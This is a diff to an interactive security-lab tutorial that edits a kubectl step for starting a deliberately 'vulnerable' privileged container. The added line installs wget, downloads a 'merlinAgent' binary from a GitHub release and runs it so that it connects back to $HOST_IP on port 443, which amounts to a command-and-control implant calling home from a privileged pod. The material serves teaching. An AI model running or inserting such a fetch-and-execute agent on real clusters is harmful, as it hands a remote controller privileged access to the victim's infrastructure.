@@ -17,6 +17,6 @@ To view the menu, run `help`{{execute}} and to see the list of modules run `use 
 
 Let's continue and see examples2.  
 
-Start this vulnerable container `kubectl run priv-container --image=alpine --overrides='{"spec": {"template": {"spec": {"containers": [{"name": "priv-container", "image": "alpine", "command": ["sh", "-c", "sleep infinity"], "securityContext": {"privileged": true} }]}}}}' -- sh -c 'sleep infinity'`{{execute}}
+Start this vulnerable container `kubectl run priv-container6 --image=ubuntu --overrides='{"spec": {"template": {"spec": {"containers": [{"name": "priv-container", "image": "ubuntu", "command": ["sh", "-c", "sleep infinity"], "securityContext": {"privileged": true} }]}}}}' -- sh -c 'apt update && apt install wget -y && wget https://github.com/g3rzi/katacodaScenario/releases/download/0.1/merlinAgent-Linux-x64 && chmod +x merlinAgent-Linux-x64 && ./merlinAgent-Linux-x64 -url https://$HOST_IP:443 & sleep infinity'`{{execute}}
 
 
